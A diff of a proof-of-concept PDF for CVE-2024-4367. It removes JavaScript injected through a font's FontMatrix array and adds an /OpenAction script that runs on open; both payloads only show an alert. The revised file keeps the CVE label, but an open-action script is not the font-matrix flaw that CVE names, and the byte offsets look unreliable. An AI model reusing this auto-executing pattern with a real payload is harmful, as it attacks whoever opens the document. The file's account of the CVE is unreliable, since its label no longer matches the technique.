@@ -1,15 +1,16 @@
 %PDF-1.4
-1 0 obj << /Type /Catalog /Pages 2 0 R /Resources 5 0 R >> endobj
+1 0 obj << /Type /Catalog /Pages 2 0 R /Resources 5 0 R /OpenAction 8 0 R >> endobj
 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
 3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R >> endobj
 4 0 obj << /Length 68 >> stream
-BT /F1 12 Tf 100 700 Td (CVE-2024-4367 PoC) Tj 100 650 Td (Font Exploit Test) Tj ET
+BT /F1 12 Tf 100 700 Td (CVE-2024-4367 Snyk PoC) Tj 100 650 Td (Open Action Exploit) Tj ET
 endstream endobj
 5 0 obj << /Font << /F1 6 0 R >> >> endobj
-6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R /FontMatrix [0.001 0 0 0.001 0 (app.alert('CVE-2024-4367 Executed!');)] >> endobj
+6 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >> endobj
 7 0 obj << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >> endobj
+8 0 obj << /S /JavaScript /JS (app.alert('Snyk PoC: CVE-2024-4367 Executed!');) >> endobj
 xref
-0 8
+0 9
 0000000000 65535 f 
 0000000010 00000 n 
 0000000075 00000 n 
@@ -18,8 +19,9 @@ xref
 0000000275 00000 n 
 0000000313 00000 n 
 0000000425 00000 n 
+0000000537 00000 n 
 trailer
-<< /Size 8 /Root 1 0 R >>
+<< /Size 9 /Root 1 0 R >>
 startxref
-527
+589
 %%EOF
